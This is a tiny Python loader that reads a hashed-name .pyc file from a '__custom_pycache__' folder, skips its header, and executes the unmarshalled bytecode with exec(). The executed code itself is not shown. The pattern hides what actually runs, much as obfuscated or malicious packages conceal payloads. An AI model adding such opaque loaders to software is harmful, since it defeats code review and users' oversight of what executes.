
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'ImageToString_280e80a8d7e54af0a8d2d4f1fc268eb0.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
